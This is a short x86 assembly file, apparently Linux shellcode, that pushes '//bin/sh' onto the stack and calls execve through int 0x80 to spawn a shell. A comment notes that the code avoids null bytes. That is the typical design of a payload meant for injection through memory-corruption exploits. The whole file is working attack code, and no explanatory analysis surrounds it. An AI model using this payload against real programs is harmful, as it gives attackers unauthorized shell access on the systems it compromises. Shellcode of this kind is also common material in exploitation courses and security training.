global _start

section .text
_start:
	xor eax, eax ; XOR eax into zero
	push eax ; push eax into stack
	
	push 0x68732f6e ; push //bin/sh in reverse to stack
	push 0x69622f2f

	mov ebx, esp ; ebx pointing to //bin/sh using esp

	push eax ; push null into stack again
	mov edx, esp ; edx to point to null

	push ebx ; //bin/sh to top of stack
	mov ecx, esp ; ecx to point to //bin/sh

	mov al, 11 ; al to 11 so no nulls
	int 0x80 ; interrupt call

